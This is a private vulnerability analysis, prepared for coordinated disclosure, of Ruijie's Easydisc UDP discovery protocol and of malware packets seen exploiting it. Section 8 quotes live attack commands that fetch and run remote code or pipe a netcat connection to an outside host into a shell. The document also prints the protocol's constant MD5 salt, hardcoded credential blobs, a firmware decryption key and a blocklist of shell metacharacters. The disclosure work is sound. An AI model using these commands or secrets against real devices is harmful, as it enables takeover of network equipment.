# Easydisc (SON EasyDiscovery) — protocol specification and security analysis

**Handling: not for publication.** This document exists to support
coordinated disclosure to Ruijie PSIRT, and onward to a CNA / CISA
ICS-CERT if they take it. Nothing here should be posted publicly or
shared outside that channel without an explicit decision to do so. See
§10 for what is and is not a vulnerability claim.

The malware family observed exploiting this protocol in the wild is
documented separately, in the private `cve-2021-35394-ecosystem`
repository (`analysis/geico/README.md`). That material is research with
a different audience and is deliberately **not** part of this
repository. This file is the protocol itself: what a vendor or CERT
needs in order to check their own builds.

---

## 1. Scope and provenance

Everything below is derived from vendor firmware, obtained from Ruijie,
plus packet captures of live exploitation attempts against this network.
No device was tested; no traffic was sent to any third party.

| build | product | arch | easydisc pkg |
|---|---|---|---|
| **ReyeeOS 2.430.0.1924** (`EG_3.0(1)B11P430`, target `mediatek/eg1510xs`) | RG-EG1510XS | `aarch64_cortex-a53` | **4.0-0** |
| **ReyeeOS 2.380** | RG-EG105GW(T) | `ramips_24kec` (MIPS32 LE) | **4.0-0** |
| **ReyeeOS 2.388** | RG-EG105GW(T) | `ramips_24kec` (MIPS32 LE) | **4.0-0** |

Binaries, from the 2.430 image:

| file | size | sha256 |
|---|---|---|
| `usr/sbin/easyson.elf` | 427,872 | `cde369a79d30e8027df55c1ecb91e39a9fe2c6e83fce6c567b2a3f1ffbafed95` |
| `usr/sbin/enet_disp.elf` | 35,304 | `8b7cfdefb588b87ae30210bfc4f39c27d68896d509da9185fb19c2bc81e76ea0` |

**Unless a statement names a build, it was derived from 2.430
(aarch64).** Where 2.380/2.388 differ, that is called out. The three
images declare the *same* easydisc package version (4.0-0) and differ in
architecture, so "version" and "product line" are not separable here —
a caveat that matters for §10.

Source filenames and line numbers below are the vendor's own, recovered
from `dbg_printf` arguments compiled into the binary
(`protocol/esw_disc.c`, `protocol/eap_disc.c`, `protocol/protocol.c`).
They should map directly onto Ruijie's tree.

## 2. Transport and listeners

Easydisc is Ruijie Reyee's proprietary self-organising-network discovery
protocol, spoken over **UDP** on two ports. The vendor's own
configuration, **byte-identical across all three images examined**:

```
# /etc/config/easydisc
config easydisc 'easydisc'
    option eapPort   '43561'
    option eapPeriod '20'
    option eswPort   '43562'
    option eswPeriod '20'
    option eswNeighbor '128'
```

| port | role | receiver | dispatcher |
|---|---|---|---|
| **43561** | `eap` | `son_eap_disc_recv` (`FUN_00413e98`) | `FUN_00412d98`, `protocol/eap_disc.c` — full type switch (§5) |
| **43562** | `esw` | `son_esw_disc_recv` (`FUN_00414968`) | `esw_disc_msg_handler`, `protocol/esw_disc.c` — accepts **only** `0x40` |

Both receivers set their thread name via `prctl(PR_SET_NAME)`, which is
how each was identified positively rather than by inference. Both push
into the **same** event queue (`FUN_00415cd0`), so the two listeners
share downstream processing but not their dispatchers.

## 3. Frame format

```
offset  size   field
0x00    16     MD5(SALT || body)
0x10    n      body  (n = recv_len - 16)
```

Maximum datagram accepted is **0x5dc (1500) bytes**.

The 16-byte prefix is an integrity check, **not** a nonce, device ID or
session token. `utils_get_md5()` in `libeasyson_utils.so` prepends a
32-byte constant before hashing:

```
SALT = "03251584460325158446032515844600"      (32 ASCII bytes)
```

so the prefix is `MD5(SALT ‖ body)`. It is a **fixed, firmware-embedded
value** — not per-device, not per-session, not derived from any
credential. Any party in possession of the firmware can compute a valid
prefix for arbitrary content. This is the protocol's only
authentication-shaped mechanism, and it authenticates nothing.

Receive path, identical in structure on both ports:

```
recvfrom(fd, buf, 0x5dc)
  recv_len < 0x10        -> drop, "Msg's length is wrong"
                            esw_disc.c:110   eap_disc.c:1477
  utils_check_md5(buf)   -> drop, "Msg's md5 is illegality"
                            esw_disc.c:116   eap_disc.c:1483
  body = buf + 0x10, len = recv_len - 0x10
  -> event queue (FUN_00415cd0)
```

The eap path allocates `len - 0xf` and NUL-terminates; the esw path
allocates `len - 0x10`.

## 4. The 460-byte header

The body begins with a fixed **460-byte (`0x1cc`) header**. Both
dispatchers `memcpy` at most `0x1cc` bytes into a zeroed local struct;
**any bytes beyond 460 are passed onward separately as a
variable-length payload**, which is how the command-carrying types
(§6) deliver their arguments.

Because the copy is length-capped into a zeroed buffer, an oversized
datagram causes **no memory corruption**. This is worth stating plainly:
the in-the-wild exploit (§8) is often mistaken for a buffer overflow and
is not one.

Field map. Offsets are relative to the start of the header. Sizes are
the `snprintf` widths the esw hello handler uses when copying each field
out, which independently corroborate the names taken from the validator
(§7) — the two agree everywhere they overlap.

| offset | size | field | guarded (esw) | guarded (eap) |
|---|---|---|---|---|
| `+0x000` | 4 | **`msg_type`** (`ntohl`) | — | — |
| `+0x004` | 4 | `mid` — message id, used for duplicate suppression (`ntohl`) | — | — |
| `+0x008` | 4 | (`ntohl`) | — | — |
| `+0x00c` | 4 | (`ntohl`) | — | — |
| `+0x020` | 16 | `ip` — validated by `son_check_ipv4` | — | — |
| `+0x048` | 18 | `mac` — `xx:xx:xx:xx:xx:xx` + NUL | ✓ | ✓ |
| `+0x068` | 16 | `sn` — serial number; also the dedup key | ✓ | ✓ |
| `+0x078` | 64 | (string) | — | — |
| `+0x0b8` | 64 | `networkName` | ✓ | ✓ |
| `+0x0f8` | 64 | `groupName` | ✓ | ✓ |
| `+0x138` | 17 | `groupId` | ✓ | ✓ |
| `+0x149` | — | `priority` | — | ✓ |
| `+0x150` | **33** | **`networkId`** — 32 chars + NUL | ✓ | ✓ |
| `+0x171` | — | `reserve1` — compared against the literal `"l3"` (§8) | — | — |
| `+0x177` | 1 | flags; bit 0 and bit 1 both read | — | — |
| `+0x188` | 10 | `product` | ✓ | ✓ |
| `+0x192` | 24 | `hostName` | ✓ | — |
| `+0x1b8` | — | `imac` | — | ✓ |

Note the validators are invoked with a pointer to *header+8*, so their
internal offsets read 8 lower than the table above (`+0x148` for
`networkId`). The values here are header-relative throughout.

## 5. Message types

Recovered from the eap dispatcher's switch (`FUN_00412d98`). **15
accepted values across 12 distinct handlers**; anything else is dropped
with *"resv unknown msg type"* at `eap_disc.c:1175`.

| `msg_type` | handler | notes |
|---|---|---|
| `0x10` | `FUN_004127a0` | also reached by `0x1010` |
| `0x11` | `FUN_004126b4` | |
| `0x12` | `FUN_00411e40` | also reached by `0x1012` |
| `0x20` | `FUN_00411d98` | |
| `0x30` | `FUN_00411a84` | |
| **`0x40`** | `FUN_0041198c` | **HELLO** — logs *"Receive hello msg from %s"* |
| `0x50`, `0x51` | `FUN_00412ac4` | receives the trailing variable payload |
| **`0x61`** | `FUN_004165f8` | **`DISC_MSG_TPYE_SH`** — carries a command (§6) |
| **`0x62`** | `FUN_00416864` | **`DISC_MSG_TPYE_SH_RSP`** — the response form |
| `0x65` | `FUN_00412cac` | |
| `0x66` | `FUN_00412d24` | receives the trailing payload |
| `0x70` | `FUN_00412c08` | receives the trailing payload only |
| `0x1010` | → `0x10` | alias |
| `0x1012` | → `0x12` | alias |

**On the naming.** The MIPS builds (2.380/2.388) retain handler-name
strings absent from the aarch64 build:
`eap_disc_handle_{hello,join,declare,conflict,merge,option,option_rsp,reject,setip,sync_pwd}_msg`
and `esw_disc_handle_hello_msg`. That is ten eap names for twelve
handlers, and the strings are not adjacent to the numeric constants, so
**the full name↔value mapping is not recoverable from the binaries
alone**. Only three edges are anchored, and only those are asserted
here: `0x40` = hello (from its own log string), `0x61` = SH, `0x62` =
SH_RSP (from the log strings inside the dispatcher). The remaining names
are listed as a set, deliberately unmapped. A vendor with the source can
close this in minutes.

The aarch64 build's lack of these strings is **not** evidence that the
handlers are absent there: it retains the `ERROR in %s [%d]` /
`WARNING in %s [%d]` macros and nine other `_disc_` function-name
strings, so this is a same-version cross-architecture build difference,
most likely in how `__func__` is referenced. It has not been confirmed
either way and no conclusion is drawn from it.

`esw` (43562) accepts only `0x40`, per the receive-path analysis
recorded in `cve-2021-35394-ecosystem`, `analysis/geico/README.md`
§2.5 — and reproduced independently in §3 above.

## 6. Type `0x61` — the command-carrying message

This is the protocol's designed-in remote-command surface, and it is the
part a vendor should look at first.

`FUN_004165f8` (`protocol/protocol.c`) handles it:

```
body (past the 460-byte header) is parsed as JSON:
    "cmd"   string   -> strdup                 (fail: protocol.c:0x14e)
    "mid"   int                                (fail: protocol.c:0x154)
    "sync"  bool     (defaults to 1 if absent)
sender identity strdup'd; 32 bytes of address context copied in
    -> enet_event_push(...)                    (fail: protocol.c:0x162)
```

logged verbatim as `DISC_MSG_TPYE_SH, cmd:%s`.

The handler itself **does not execute anything**. It marshals the
command onto a queue consumed by a separate daemon, `enet_disp.elf`,
which carries the matching `cmd:%s` and `exec mqlink_cmd:%s` strings and
has no socket of its own. So the execution surface is: *JSON over UDP →
queue → second process*. Characterising `0x61` as "a message type that
runs a shell command" is close but imprecise; the accurate statement is
that it is a command-transport type whose consumer is out of process.

One guard exists: the handler compares the message's `sn` field against
a stored 16-byte value and returns early on a match.

**The security-relevant question for the vendor is what authorises a
`0x61` message.** Reaching this handler requires only a well-formed
frame with a correct salted-MD5 prefix (§3) — a check computable by
anyone holding the firmware — and `msg_type = 0x61` on UDP/43561. No
credential is consulted on the path described above.

## 7. Input validation

`param_safety_check`, exported by `liblib_c.so`, walks a string and
rejects it if it contains any of **ten** characters:

```
&    |    ;    $    <    >    '    `    CR    LF
```

logged inside the library as `str has inject characters: '%c'`.

Each dispatcher wraps it in a per-field checker
(`FUN_0041504c` for esw, `FUN_00411138` for eap) which logs
*"message (%s) safety check failed on field '%s'"* at `esw_disc.c:0xfa`,
and applies it field by field — the ✓ columns in §4. A single failing
field drops the entire message before the type switch runs:

- esw: *"esw hello msg param safety check failed, drop it"*
- eap: *"eap message param safety check failed, drop it"* (`eap_disc.c:0x43c`)

The character set is a **blocklist of shell metacharacters**, which
tells you what the fields were historically interpolated into. It is
present and called on both ports in 2.430. `liblib_c.so` is
byte-identical between 2.380 and 2.388 and contains
`param_safety_check` in both; **whether those builds' easydisc actually
calls it on the esw hello path is untested** — see §10.

## 8. Observed exploitation

A malware family tracked here as *geico* has been sending crafted
Easydisc datagrams to UDP/43562 since **2026-08-13**, from
`45.135.194.35`, `204.76.203.21`, `45.135.193.159` and `45.138.16.34`.
388 bytes, laid out as:

```
[16B salted MD5][4B msg_type = 0x40][332B pwntools cyclic()][35B trailer][NUL]
```

Three properties make this worth a vendor's attention regardless of
whether it currently succeeds:

**The MD5 prefix validates.** Both observed variants pass
`utils_check_md5` byte-exactly, so **the operator holds the firmware
salt**. Within a variant the prefix is constant across source IPs and
across days, consistent with a deterministic checksum over fixed
content.

**The filler is a ruler, not an overflow.** `16 + 4 + 332 = 352`, so the
trailer begins at header offset **`0x150` — exactly `networkId`**.
`cyclic()` is the pwntools helper used to *find* an offset during
development; its survival in the shipped payload indicates the offset
was derived experimentally against a real target.

**The trailer is fitted to the struct to the byte.** Both variants are
**exactly 35 bytes**:

| variant | command (chars) | suffix | total |
|---|---|---|---|
| `nc` | `'&nc 160.119.71.134 5959\|sh&'` (29) | `ppppl3` (6) | 35 |
| `g6.wtf` | `'&wget http://g6.wtf/ge -O-\|sh&'` (32) | `al3` (3) | 35 |

`networkId` is copied out with `snprintf(dst, 0x21, ...)` — 32
characters. The `g6.wtf` command is *exactly* 32, surviving the cap
intact. And in **both** variants, padding to a common 35-byte total
places the literal `l3` at header offset **`+0x171`**, which is
`reserve1` — a field the esw hello handler compares against the literal
`"l3"`. Two different command lengths padded to the same total, landing
the same two bytes on the same field, is not coincidence.

`reserve1 == "l3"` is **one of several** conditions that set the
auto-merge flag in `FUN_004151fc`; it also requires the device to be in
a qualifying mode (`FUN_0042a2b4`: mode ∈ {3,4,5,100}), the message's
`networkId` to differ from the device's own, two global flags, and a
per-neighbour merge counter below 2. It steers the message toward the
merge path rather than triggering it alone.

**On 2.430 the packet does not work.** It is rejected at §7 — the
payload begins with `'`, the first character of the blocklist — and
dropped before the type switch. A second barrier sits behind that: the
merge consumer `FUN_004147fc` hands its result to `son_utils_safe_exec`,
which is `pipe`/`fork`/`dup2`/**`execvp(argv[0], argv)`** — argv-style,
no shell, nothing for a quote break-out to break out of.

So this is an **n-day against unpatched or differently-configured
devices, not a 0-day against current firmware.** It is reported here
because the payload's precision — the salt, the `0x150` alignment, the
32-character fit, the `reserve1` padding — is very hard to explain
unless it was developed against a build where it *did* work.

## 9. Hardcoded credentials in the merge path

`FUN_004147fc` (`esw_disc.c:0x4f`) builds the auto-merge request and
passes it to `son_utils_safe_exec` as
`dev_sta set -m esw_networkId_merge '<json>'`:

```json
{"password":"<embedded>", "type":"enc","fromSn":["%s"],
 "fromNetworkId":"%s","toNetworkId":"%s"}
```

with a `"force":"true"` variant on the other branch. The password is a
**literal embedded in the binary**, present in both branches. These are
OpenSSL `Salted__` base64 blobs (`U2FsdGVkX1...`):

| build | value |
|---|---|
| 2.430 (merge path) | `U2FsdGVkX18yODMzMjM5Offgi6OTL+KYXY1eByqCJnI=` |
| 2.430 (also present) | `U2FsdGVkX181MjM0NDUwNDu5BFRGOi81x9t2Ja1Lbf4=` |
| 2.430 (also present) | `U2FsdGVkX182MzcyNTI5Nl9n5bGc6xMYZ/QfiDgl/Cc=` |
| 2.380 / 2.388 | `U2FsdGVkX18POF0/cM8IwywAcZUK8zQngpUv7C2zKng=` |

They are not decrypted here and their scope is not established — that
is the vendor's to assess. Two observations are offered: the value
**differs between product lines**, so it is not one universal constant;
and it is used as the authorisation for a network-merge operation that
an unauthenticated network peer can influence the inputs to.

> **Extended, 2026-09-20.** The embedded value is not a defensive
> fallback but the **operative credential on a fresh device**:
> `FUN_00433ac0` reads `/etc/sd_config/admin` and falls back to the
> literal on failure, and that file **is not present in any of the three
> images**. See [`firmware-audit.md`](firmware-audit.md)
> §3.7 — and §3.1–3.4 of the same document for the broader finding this
> sits inside: the SON MQTT broker's private key, PSK and account
> credentials are all shipped in firmware and **byte-identical across
> both product lines and all three versions**, with an ACL granting every
> authenticated principal every topic. That is a materially larger
> exposure than anything in this protocol.

## 10. Assessment

What is **established**:

1. Easydisc accepts unauthenticated UDP on 43561/43562. Its only
   integrity mechanism is an MD5 over a **firmware-embedded constant
   salt**, computable by anyone with the image.
2. The protocol includes a **designed-in command-transport message
   type** (`0x61`) whose consumer is a separate daemon with `exec`
   strings.
3. Message fields are guarded by a **shell-metacharacter blocklist**,
   whose existence implies the fields have been shell-interpolated at
   some point in this code's history.
4. A **hardcoded credential** authorises the auto-merge operation.
5. An active malware family has been sending **precisely fitted**
   exploit packets at this surface since 2026-08-13, and those packets
   demonstrate possession of the firmware salt and byte-level knowledge
   of the header layout.

What is **not** established, and is not claimed:

- **That any shipping build is exploitable.** On 2.430 the observed
  packet is rejected twice over. No vulnerable build has been
  identified.
- **Which builds, if any, lack the validation.** `liblib_c.so` contains
  `param_safety_check` in 2.380 and 2.388, but whether easydisc *calls*
  it on the esw hello path in those builds is untested. The binaries are
  stripped MIPS o32; naive approaches (`readelf -s`, `jal`-target
  scanning, Ghidra xrefs) each return false negatives on them, so a
  negative result from those methods should not be trusted. The sound
  test is to resolve the `$gp`-relative GOT offset for
  `param_safety_check` and count `lw $t9,off($gp)` / `jalr $t9` sites.
- **That this maps to a known CVE.** It matches no published Ruijie
  advisory we can find — CVE-2021-43162/43163 (HTTP/luci),
  CVE-2023-7330 (upload), CVE-2024-47146 (MQTT), CVE-2025-34057
  (info-disclosure), Team82's "Open Sesame" (cloud/MITM) are all
  different surfaces. **"No CVE found" is not "no CVE exists"**, and it
  is entirely possible this was reported privately and fixed without an
  advisory. Establishing that is a reason to contact the vendor, not a
  claim to make about them.

Suggested questions for the vendor, in priority order:

1. In which ReyeeOS versions and product lines does the esw hello path
   call `param_safety_check` on `networkId`? Was it always there?
2. What authorises a `0x61` / `DISC_MSG_TPYE_SH` message, end to end,
   from datagram to `enet_disp.elf` execution?
3. What is the scope of the embedded `esw_networkId_merge` password —
   per-model, per-firmware, or wider?
4. Is the salted-MD5 prefix intended as an integrity check only, or was
   it ever relied on as authentication?

## 11. Reproduction notes

- Firmware decryption (images ship encrypted): strip line 1
  (`upgrade_crypt_v2!@2023`), base64-decode, then OpenSSL `Salted__` +
  8-byte salt, `EVP_BytesToKey(FW_KEY, salt, keylen=32, ivlen=16)` with
  MD5 iterated **2023×**, AES-256-CBC, where
  `FW_KEY = BR0khBR0khsHi4MkNGrJ421Yf&j8ceh6`. Method and constant are
  public (`github.com/gnacho/reyee-nbs3200-root`).
- Both receivers were identified by `prctl(PR_SET_NAME)` rather than by
  log strings, which is the more reliable anchor in stripped builds.
- Ghidra's aarch64 import does not create `adrp+add` constant
  references; decoding those pairs out of `.text` directly recovers
  them. Ghidra string xrefs *do* resolve in the aarch64 build and were
  used throughout.
- On the MIPS builds, instruction-level search returned
  `instructions_scanned: 0` in this project — those programs are
  imported but not disassembled. Treat any "not found" from instruction
  search on them as a tooling result, not a finding.
